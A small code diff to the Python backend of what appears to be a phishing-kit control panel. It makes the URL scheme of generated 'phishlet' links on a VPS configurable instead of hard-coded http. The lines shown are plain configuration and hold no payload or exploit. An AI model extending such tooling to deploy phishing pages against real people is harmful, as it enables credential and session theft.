@@ -33,6 +33,7 @@ FF_KIOSK_DEFAULT = os.getenv("FF_KIOSK_DEFAULT", "1")
 ALLOW_REGISTER = os.getenv("ALLOW_REGISTER", "true").lower() in {"1", "true", "yes"}
 PHISHLET_BIND = os.getenv("PHISHLET_BIND", "127.0.0.1")
 PHISHLET_URL_PREFIX = os.getenv("PHISHLET_URL_PREFIX", "path")
+PUBLIC_SCHEME = os.getenv("PUBLIC_SCHEME", "http")
 
 LOG_FILE = "commands.log"
 BACKEND_DIR = Path(__file__).resolve().parent
@@ -110,8 +111,8 @@ def phishlet_port_arg(port: int) -> str:
 
 def phishlet_url(key: str, port: int) -> str:
     if PHISHLET_URL_PREFIX == "port":
-        return f"http://{VPS_IP}:{port}"
-    return f"http://{VPS_IP}/{key}/"
+        return f"{PUBLIC_SCHEME}://{VPS_IP}:{port}"
+    return f"{PUBLIC_SCHEME}://{VPS_IP}/{key}/"
 
 
 async def run_command(
